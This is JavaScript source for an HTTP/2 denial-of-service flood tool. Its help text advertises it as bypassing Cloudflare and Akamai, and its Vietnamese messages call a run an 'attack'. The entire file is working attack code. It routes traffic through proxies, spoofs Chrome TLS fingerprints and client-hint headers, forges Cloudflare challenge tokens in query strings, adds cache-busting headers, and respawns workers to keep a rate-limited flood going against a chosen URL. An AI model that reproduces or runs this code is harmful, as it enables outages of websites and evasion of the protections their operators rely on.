const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

// Parse arguments properly - Adapted for compatibility with 8.js
const target = process.argv[2];
const time = parseInt(process.argv[3]);
const threadsArg = process.argv[4]; // This could be "1" (used as query if applicable)
const ratelimit = parseInt(process.argv[5]);
const proxyStr = process.argv[6];
const cookies = process.argv[7] || '';
const userAgentProvided = process.argv[8] || 'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36';

const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : threadsArg; // Default to threadsArg if it's "1"
const delayIndex = process.argv.indexOf('--delay');
let delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
let debugMode = process.argv.includes('--debug');
let cacheMode = process.argv.includes('--cache');
const fullMode = process.argv.includes('--full');

// Auto set for --full
if (fullMode) {
    if (!debugMode) debugMode = true;
    if (delay === 0) delay = 1;
    if (!cacheMode) cacheMode = true;
}

let threads = 1; // Default to 1 for single-threaded flood per instance

function printHelp() {
    console.clear();
    console.log('\x1b[36mBypass Customer Firewall\x1b[0m');
    console.log('\x1b[36mHigh-performance HTTP/2 flood tool for maximum efficiency Bypasses Cloudflare- by @Vinh\x1b[0m');
    console.log('\x1b[33mOptions:\x1b[0m');
    console.log('  \x1b[37m--query (1/2/3)\x1b[0m            : Different query patterns for CF bypass');
    console.log('  \x1b[37m--delay (1-1000)\x1b[0m            : Delay between connections (ms)');
    console.log('  \x1b[37m--debug\x1b[0m                     : Enable debug mode for status tracking');
    console.log('  \x1b[37m--cache\x1b[0m                     : Enable cache bypass headers');
    console.log('  \x1b[37m--full\x1b[0m                      : Bypasses Cloudflare, Akamai');
    console.log('\x1b[33mUsage:\x1b[0m');
    console.log('  \x1b[37mnode clz <url> <time> <threads> <rate> <proxy-file> [options]\x1b[0m');
    console.log('  \x1b[37mExample: node clz "https://www.example.com/" 250 5 6 proxy.txt --full\x1b[0m');
    console.log('\x1b[33mIntroduction:\x1b[0m');
    console.log('  \x1b[32mHigh-performance HTTP/2 flood tool for maximum efficiency Bypasses Cloudflare, Akamai.\x1b[0m');
    process.exit(1);
}

// Early validation
if (!target || !time || !ratelimit || !proxyStr) {
    printHelp();
}

// Validate proxy
if (!proxyStr || proxyStr.trim() === '') {
    console.log(`\x1b[31m[ERROR]\x1b[0m Lỗi: Không tìm thấy proxy!`);
    process.exit(1);
}

const url = new URL(target);
const proxy = [proxyStr.trim()]; // Single proxy as array

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let custom_table = 4096;
let custom_window = 65535;
let custom_header = 4096;
let custom_update = 65535;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

// CookieJar để duy trì phiên
class CookieJar {
    constructor() {
        this.cookies = new Map();
        this.cookieMetadata = new Map();
    }

    setCookie(cookieString, domain) {
        const cookies = cookieString.split(';').map(cookie => cookie.trim());
        const now = Date.now();

        cookies.forEach(cookie => {
            const [nameValue, ...attributes] = cookie.split(';');
            const [name, value] = nameValue.split('=');
            const key = `${domain}:${name.trim()}`;

            const parsedAttributes = this._parseCookieAttributes(attributes);

            this.cookies.set(key, value.trim());
            this.cookieMetadata.set(key, {
                domain: domain,
                path: parsedAttributes.path || '/',
                expires: parsedAttributes.expires ? new Date(parsedAttributes.expires).getTime() : null,
                httpOnly: parsedAttributes.httpOnly || false,
                secure: parsedAttributes.secure || false,
                sameSite: parsedAttributes.sameSite || 'Lax',
                created: now
            });
        });

        this._cleanupExpiredCookies();
    }

    getCookieHeader(domain) {
        const now = Date.now();
        const validCookies = [];

        for (const [key, value] of this.cookies.entries()) {
            if (key.startsWith(`${domain}:`)) {
                const metadata = this.cookieMetadata.get(key);
                if (metadata && 
                    (!metadata.expires || metadata.expires > now) &&
                    (!metadata.secure || url.protocol === 'https:')) {
                    validCookies.push(`${key.split(':')[1]}=${value}`);
                }
            }
        }

        return validCookies.join('; ');
    }

    _parseCookieAttributes(attributes) {
        const parsedAttributes = {};

        attributes.forEach(attr => {
            const [name, value] = attr.trim().split('=');
            switch (name.toLowerCase()) {
                case 'expires':
                    parsedAttributes.expires = value;
                    break;
                case 'path':
                    parsedAttributes.path = value;
                    break;
                case 'domain':
                    parsedAttributes.domain = value;
                    break;
                case 'httponly':
                    parsedAttributes.httpOnly = true;
                    break;
                case 'secure':
                    parsedAttributes.secure = true;
                    break;
                case 'samesite':
                    parsedAttributes.sameSite = value;
                    break;
            }
        });

        return parsedAttributes;
    }

    _cleanupExpiredCookies() {
        const now = Date.now();
        
        for (const [key, metadata] of this.cookieMetadata.entries()) {
            if (metadata.expires && metadata.expires < now) {
                this.cookies.delete(key);
                this.cookieMetadata.delete(key);
            }
        }
    }
}

const cookieJar = new CookieJar();
if (cookies) {
    cookieJar.setCookie(cookies, url.hostname);
}

function parseUA(ua) {
    const versionMatch = ua.match(/Chrome\/([\d.]+)/);
    const fullVersion = versionMatch ? versionMatch[1] : '140.0.0.0';
    const majorVersion = fullVersion.split('.')[0];
    const platformMatch = ua.match(/\(([^;)]+)/);
    const platformStr = platformMatch ? platformMatch[1] : 'Linux; Android 14; SM-S918B';
    let secChUaPlatform, secChUaMobile, secChUaArch, secChUaBitness, secChUaPlatformVersion;
    if (platformStr.includes('Android')) {
        secChUaPlatform = '"Android"';
        secChUaMobile = '?1';
        secChUaArch = '"arm"';
        secChUaBitness = '"64"';
        secChUaPlatformVersion = '"14.0.0"';
    } else {
        secChUaPlatform = '"Android"';
        secChUaMobile = '?1';
        secChUaArch = '"arm"';
        secChUaBitness = '"64"';
        secChUaPlatformVersion = '"14.0.0"';
    }
    const secChUa = `"Chromium";v="${fullVersion}", "Not=A?Brand";v="8", "Google Chrome";v="${fullVersion}"`;
    const secChUaFullVersionList = `"Not=A?Brand";v="8.0.0.0", "Chromium";v="${fullVersion}", "Google Chrome";v="${fullVersion}"`;
    return { secChUa, secChUaFullVersionList, secChUaPlatform, secChUaMobile, secChUaArch, secChUaBitness, secChUaPlatformVersion };
}

const uaParsed = parseUA(userAgentProvided);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const payloadLength = Buffer.isBuffer(payload) ? payload.length : Buffer.byteLength(payload);
    let frame = Buffer.alloc(9);
    
    frame.writeUInt32BE(payloadLength << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    
    if (payloadLength > 0) {
        const payloadBuffer = Buffer.isBuffer(payload) ? payload : Buffer.from(payload);
        frame = Buffer.concat([frame, payloadBuffer]);
    }
    return frame;
}

function decodeFrame(data) {
    if (data.length < 9) return null;
    
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUInt8(4);
    const streamId = data.readUInt32BE(5) & 0x7FFFFFFF;
    const offset = flags & 0x20 ? 5 : 0;
    if (data.length < 9 + offset + length) {
        return null;
    }
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
    }
    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function generateSyncedBrowserHeaders(providedUA = '') {
    if (providedUA) {
        const parsed = parseUA(providedUA);
        return {
            userAgent: providedUA,
            secChUa: parsed.secChUa,
            secChUaFullVersionList: parsed.secChUaFullVersionList,
            secChUaFullVersion: `"${parsed.fullVersion || '140.0.0.0'}"`,
            secChUaPlatform: parsed.secChUaPlatform,
            secChUaPlatformVersion: parsed.secChUaPlatformVersion,
            secChUaArch: parsed.secChUaArch,
            secChUaBitness: parsed.secChUaBitness,
            secChUaModel: `""`,
            secChUaMobile: parsed.secChUaMobile,
            secChDeviceMemory: `"8"`,
            secChDpr: "1",
            secChViewportWidth: `"1920"`,
            secChViewportHeight: `"1080"`,
            secChPrefersColorScheme: "light",
            secChPrefersReducedMotion: "no-preference",
            secChEct: `"4g"`,
            secChDownlink: "10",
            secChRtt: `"50"`,
            secChUaWow64: undefined,
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            acceptEncoding: "gzip, deflate, br",
            referer: `https://${url.hostname}/`
        };
    }

    const chromeVersion = Math.floor(Math.random() * (130 - 127 + 1)) + 127;
    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 5000) + 1}.${Math.floor(Math.random() * 100) + 1}`;

    const platforms = [
        { os: 'Windows NT 10.0; Win64; x64', platform: '"Windows"', platformVersion: `"13.0.0"`, arch: '"x86"', bitness: '"64"', model: '""', mobile: "?0" },
        { os: 'Macintosh; Intel Mac OS X 15_0', platform: '"macOS"', platformVersion: `"15.0.0"`, arch: '"x86"', bitness: '"64"', model: '""', mobile: "?0" },
        { os: 'Macintosh; arm64 Mac OS X 15_0', platform: '"macOS"', platformVersion: `"15.0.0"`, arch: '"arm"', bitness: '"64"', model: '""', mobile: "?0" },
        { os: 'X11; Linux x86_64', platform: '"Linux"', platformVersion: `"6.11.0"`, arch: '"x86"', bitness: '"64"', model: '""', mobile: "?0" },
        { os: 'X11; Linux aarch64', platform: '"Linux"', platformVersion: `"6.11.0"`, arch: '"arm"', bitness: '"64"', model: '""', mobile: "?0" },
        { os: 'Android 15; Pixel 9 Pro', platform: '"Android"', platformVersion: `"15.0"`, arch: '"arm"', bitness: '"64"', model: `"Pixel 9 Pro"`, mobile: "?1" },
        { os: 'Android 15; Galaxy S25', platform: '"Android"', platformVersion: `"15.0"`, arch: '"arm"', bitness: '"64"', model: `"Galaxy S25"`, mobile: "?1" },
        { os: 'iPhone; CPU iPhone OS 18_0 like Mac OS X', platform: '"iOS"', platformVersion: `"18.0.0"`, arch: '"arm"', bitness: '"64"', model: `"iPhone 16 Pro"`, mobile: "?1" },
        { os: 'iPad; CPU OS 18_0 like Mac OS X', platform: '"iOS"', platformVersion: `"18.0.0"`, arch: '"arm"', bitness: '"64"', model: `"iPad Pro (M4)"`, mobile: "?1" },
    ];
    const selected = platforms[Math.floor(Math.random() * platforms.length)];

    const userAgentVariants = [
        `Mozilla/5.0 (${selected.os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion}${selected.mobile === "?1" ? " Mobile" : ""} Safari/537.36`,
        `Mozilla/5.0 (${selected.os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion}${selected.mobile === "?1" ? " Mobile" : ""} Safari/537.36 Edg/${fullVersion}`,
    ];
    const userAgent = userAgentVariants[Math.floor(Math.random() * userAgentVariants.length)];

    const brandVariants = [
        `"Not-A.Brand";v="8", "Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}"`,
        `"Chromium";v="${chromeVersion}", "Not-A.Brand";v="99", "Google Chrome";v="${chromeVersion}"`,
    ];
    const brandValue = brandVariants[Math.floor(Math.random() * brandVariants.length)];
    const fullVersionList = brandValue.replace(/v="(\d+)"/g, `v="${fullVersion}"`);

    const deviceMemoryOptions = [4, 8, 16]; // Hợp lý cho Chrome
    const deviceMemory = deviceMemoryOptions[Math.floor(Math.random() * deviceMemoryOptions.length)];
    const dpr = (Math.random() * 1.5 + 1).toFixed(1);
    const screenWidthOptions = [1920, 2560, 1440, 1280, 1366];
    const screenHeightOptions = [1080, 1440, 900, 800, 768];
    const screenWidth = screenWidthOptions[Math.floor(Math.random() * screenWidthOptions.length)];
    const screenHeight = screenHeightOptions[Math.floor(Math.random() * screenHeightOptions.length)];
    const viewportWidth = Math.floor(screenWidth * (Math.random() * 0.1 + 0.9));
    const viewportHeight = Math.floor(screenHeight * (Math.random() * 0.1 + 0.9));
    const colorScheme = Math.random() > 0.5 ? "light" : "dark";
    const reducedMotion = Math.random() > 0.5 ? "no-preference" : "reduce";
    const ect = ["3g", "4g"][Math.floor(Math.random() * 2)];
    const downlink = (Math.random() * 9 + 1).toFixed(1);
    const rtt = Math.floor(Math.random() * 151) + 50;
    const wow64 = selected.os.includes('Windows') ? (Math.random() > 0.8 ? "?1" : "?0") : undefined;

    const acceptVariants = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    ];
    const accept = acceptVariants[Math.floor(Math.random() * acceptVariants.length)];

    const acceptEncodingVariants = [
        "gzip, deflate, br",
    ];
    const acceptEncoding = acceptEncodingVariants[Math.floor(Math.random() * acceptEncodingVariants.length)];

    const refererList = [
        "https://www.google.com/",
        "https://www.bing.com/",
        `https://${url.hostname}/`,
    ];
    const referer = refererList[Math.floor(Math.random() * refererList.length)];

    const secChUaGrease = `"Not)A;Brand";v="${Math.floor(Math.random() * 99) + 1}"`;

    return {
        userAgent: userAgent,
        secChUa: `${secChUaGrease}, ${brandValue}`,
        secChUaFullVersionList: `${secChUaGrease}, ${fullVersionList}`,
        secChUaFullVersion: `"${fullVersion}"`,
        secChUaPlatform: selected.platform,
        secChUaPlatformVersion: selected.platformVersion,
        secChUaArch: selected.arch,
        secChUaBitness: selected.bitness,
        secChUaModel: selected.model,
        secChUaMobile: selected.mobile,
        secChDeviceMemory: `"${deviceMemory}"`,
        secChDpr: dpr,
        secChViewportWidth: `"${viewportWidth}"`,
        secChViewportHeight: `"${viewportHeight}"`,
        secChPrefersColorScheme: colorScheme,
        secChPrefersReducedMotion: reducedMotion,
        secChEct: `"${ect}"`,
        secChDownlink: downlink,
        secChRtt: `"${rtt}"`,
        secChUaWow64: wow64,
        accept: accept,
        acceptEncoding: acceptEncoding,
        referer: referer
    };
}

function createConnectionWithRetry(proxyHost, proxyPort, retryCount = 0) {
    return new Promise((resolve, reject) => {
        if (retryCount >= 3) {
            reject(new Error('Vượt quá số lần thử lại tối đa'));
            return;
        }
        const netSocket = net.connect(Number(proxyPort), proxyHost);
        
        const connectionTimeout = setTimeout(() => {
            netSocket.destroy();
            setTimeout(() => {
                createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                    .then(resolve)
                    .catch(reject);
            }, 1000);
        }, 10000);
        
        netSocket.on('connect', () => {
            clearTimeout(connectionTimeout);
            netSocket.once('data', () => {
                const tlsSocket = tls.connect({
                    socket: netSocket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA', // Match Chrome ciphers order for JA3
                    sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
                    groups: 'X25519:P-256:P-384', // Match Chrome curves
                    secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
                    secure: true,
                    minVersion: 'TLSv1.3',
                    maxVersion: 'TLSv1.3',
                    rejectUnauthorized: false,
                    timeout: 8000
                });
                
                const tlsTimeout = setTimeout(() => {
                    tlsSocket.destroy();
                    setTimeout(() => {
                        createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                            .then(resolve)
                            .catch(reject);
                    }, 1000);
                }, 8000);
                
                tlsSocket.on('secureConnect', () => {
                    clearTimeout(tlsTimeout);
                    resolve({ tlsSocket });
                });
                
                tlsSocket.on('error', (err) => {
                    clearTimeout(tlsTimeout);
                    setTimeout(() => {
                        createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                            .then(resolve)
                            .catch(reject);
                    }, 1000);
                });
            });
            
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        });
        
        netSocket.on('error', (err) => {
            clearTimeout(connectionTimeout);
            setTimeout(() => {
                createConnectionWithRetry(proxyHost, proxyPort, retryCount + 1)
                    .then(resolve)
                    .catch(reject);
            }, 1000);
        });
    });
}

async function go() {
    var [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    if (!proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 10);
        return;
    }
    
    try {
        const { tlsSocket } = await createConnectionWithRetry(proxyHost, proxyPort);
        
        let streamId = 1;
        let data = Buffer.alloc(0);
        let hpack = new HPACK();
        hpack.setTableSize(4096);
        
        const browserHeaders = generateSyncedBrowserHeaders(userAgentProvided);
        const languages = [
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "fr-FR,fr;q=0.9,en;q=0.8",
            "de-DE,de;q=0.9,en;q=0.8",
            "es-ES,es;q=0.9,en;q=0.8",
            "ja-JP,ja;q=0.9,en;q=0.8",
            "zh-CN,zh;q=0.9,en;q=0.8",
            "vi-VN,vi;q=0.9,en;q=0.8",
            "id-ID,id;q=0.9,en;q=0.8",
        ];
        const randomLanguage = languages[Math.floor(Math.random() * languages.length)];
        
        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(custom_update, 0);
        
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([
                [1, custom_header],
                [2, 1],
                [3, 100],
                [4, custom_window],
                [5, 16384]
            ])),
            encodeFrame(0, 8, updateWindow)
        ];
        
        tlsSocket.on('data', (eventData) => {
            data = Buffer.concat([data, eventData]);
            
            while (data.length >= 9) {
                const frame = decodeFrame(data);
                if (frame != null) {
                    data = data.subarray(9 + frame.length);
                    
                    if (frame.type == 4 && frame.flags == 0) {
                        tlsSocket.write(encodeFrame(0, 4, "", 1));
                    }
                    
                    if (frame.type == 1) {
                        try {
                            const decodedHeaders = hpack.decode(frame.payload);
                            const statusHeader = decodedHeaders.find(x => x[0] == ':status');
                            if (statusHeader) {
                                const status = statusHeader[1];
                                if (debugMode && !statuses[status]) statuses[status] = 0;
                                if (debugMode) statuses[status]++;
                            }
                            // Xử lý set-cookie trong response headers (type 1)
                            if (debugMode) {
                                const cookieHeader = decodedHeaders.find(x => x[0] == 'set-cookie');
                                if (cookieHeader) {
                                    cookieJar.setCookie(cookieHeader[1], url.hostname);
                                }
                            }
                        } catch (e) {
                            // Bỏ qua lỗi decode
                        }
                    }
                    
                    if (frame.type == 7) { // GOAWAY
                        if (debugMode && !statuses["GOAWAY"]) statuses["GOAWAY"] = 0;
                        if (debugMode) statuses["GOAWAY"]++;
                        tlsSocket.end(() => {
                            tlsSocket.destroy();
                        });
                        return;
                    }
                } else {
                    break;
                }
            }
        });
        
        tlsSocket.on('close', () => {
            setTimeout(go, 10);
        });
        
        tlsSocket.on('error', (err) => {
            tlsSocket.destroy();
            setTimeout(go, 100);
        });
        
        tlsSocket.write(Buffer.concat(frames));
        
        // PING định kỳ giống Chrome
        setInterval(() => {
            if (!tlsSocket.destroyed) {
                tlsSocket.write(encodeFrame(0, 6, crypto.randomBytes(8), 0));
            }
        }, 30000 + Math.random() * 10000);

        // Initial random delay để giống user click
        setTimeout(doWrite, Math.random() * 1000);

        function doWrite() {
            if (tlsSocket.destroyed) {
                return;
            }
            
            function handleQuery(query) {
                if (query === '1') {
                    return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                } else if (query === '2') {
                    return url.pathname + '?' + generateRandomString(6, 7) + '=' + generateRandomString(6, 7);
                } else if (query === '3') {
                    return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7) + '=' + generateRandomString(4, 8);
                } else {
                    return url.pathname + '?' + generateRandomString(4, 6) + '=' + generateRandomString(6, 10);
                }
            }
            
            const requests = [];
            const pathValue = query ? handleQuery(query) : url.pathname;
            
            // Thứ tự headers giống Chrome: Pseudo first, user-agent, sec-ch, accept, sec-fetch, referer, cookie
            const headersArray = [
                [":method", "GET"],
                [":scheme", "https"],
                [":authority", url.hostname],
                [":path", pathValue],
                ["user-agent", userAgentProvided || browserHeaders.userAgent],
                ["sec-ch-ua", browserHeaders.secChUa],
                ["sec-ch-ua-mobile", browserHeaders.secChUaMobile],
                ["sec-ch-ua-platform", browserHeaders.secChUaPlatform],
                ["sec-ch-ua-platform-version", browserHeaders.secChUaPlatformVersion],
                ["sec-ch-ua-arch", browserHeaders.secChUaArch],
                ["sec-ch-ua-bitness", browserHeaders.secChUaBitness],
                ["sec-ch-ua-model", browserHeaders.secChUaModel],
                ["sec-ch-ua-full-version", browserHeaders.secChUaFullVersion],
                ["sec-ch-ua-full-version-list", browserHeaders.secChUaFullVersionList],
                ["sec-ch-device-memory", browserHeaders.secChDeviceMemory],
                ["sec-ch-dpr", browserHeaders.secChDpr],
                ["sec-ch-viewport-width", browserHeaders.secChViewportWidth],
                ["sec-ch-viewport-height", browserHeaders.secChViewportHeight],
                ["sec-ch-prefers-color-scheme", browserHeaders.secChPrefersColorScheme],
                ["sec-ch-prefers-reduced-motion", browserHeaders.secChPrefersReducedMotion],
                ["sec-ch-ect", browserHeaders.secChEct],
                ["sec-ch-downlink", browserHeaders.secChDownlink],
                ["sec-ch-rtt", browserHeaders.secChRtt],
                ["accept", browserHeaders.accept],
                ["accept-encoding", browserHeaders.acceptEncoding],
                ["accept-language", randomLanguage],
                ["sec-fetch-site", Math.random() > 0.7 ? "same-origin" : (Math.random() > 0.5 ? "cross-site" : "none")],
                ["sec-fetch-mode", "navigate"],
                ["sec-fetch-user", "?1"],
                ["sec-fetch-dest", "document"],
                ["upgrade-insecure-requests", "1"],
                ["referer", browserHeaders.referer],
                ["cookie", cookieJar.getCookieHeader(url.hostname)]
            ];
            if (browserHeaders.secChUaWow64) {
                headersArray.push(["sec-ch-ua-wow64", browserHeaders.secChUaWow64]);
            }
            if (cacheMode) {
                headersArray.push(["cache-control", "no-cache"]);
                headersArray.push(["pragma", "no-cache"]);
                headersArray.push(["expires", "0"]);
            } else {
                headersArray.push(["cache-control", Math.random() > 0.5 ? "no-cache" : "max-age=0"]);
            }
            
            const encodedHeaders = hpack.encode(headersArray);
            
            const priorityPayload = Buffer.alloc(5);
            priorityPayload.writeUInt32BE(0, 0);
            priorityPayload.writeUInt8(Math.floor(Math.random() * 256), 4);
            
            const payload = Buffer.concat([priorityPayload, encodedHeaders]);
            
            requests.push(encodeFrame(streamId, 1, payload, 0x25));
            streamId += 2;
            
            tlsSocket.write(Buffer.concat(requests), (err) => {
                if (!err && !tlsSocket.destroyed) {
                    const baseDelay = 1000 / ratelimit;
                    const jitter = Math.random() * baseDelay * 0.5; // Tăng jitter 50% để giống user
                    const randomDelay = baseDelay + jitter - (baseDelay * 0.25);
                    setTimeout(doWrite, randomDelay);
                }
            });
        }
    } catch (err) {
        setTimeout(go, 1000);
    }
}

if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    cluster.on('exit', (worker) => {
        delete workers[worker.id];
        cluster.fork({ core: worker.id % os.cpus().length });
    });
    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
    if (debugMode) {
        let previousLineLength = 0;
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w] && workers[w][0].state == 'online' && workers[w][1]) {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null) statuses[code] = 0;
                            statuses[code] += st[code];
                        }
                    }
                }
            }
            const line = `${JSON.stringify(statuses)}`;
            const padding = ' '.repeat(Math.max(0, previousLineLength - line.length));
            process.stdout.write(`\r${line}${padding}`);
            previousLineLength = line.length;
        }, 1000);
    }
    process.on('SIGINT', () => {
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    });
    setTimeout(() => {
        console.log('\x1b[32m[SUCCESS]\x1b[0m Tấn công hoàn tất');
        for (let id in cluster.workers) {
            cluster.workers[id].kill();
        }
        process.exit(0);
    }, time * 1000);
} else {
    let conns = 0;
    
    let i = setInterval(() => {
        conns++;
        go();
    }, delay || 10);
    
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 1000);
    }
    
    setTimeout(() => {
        process.exit(0);
    }, time * 1000);
}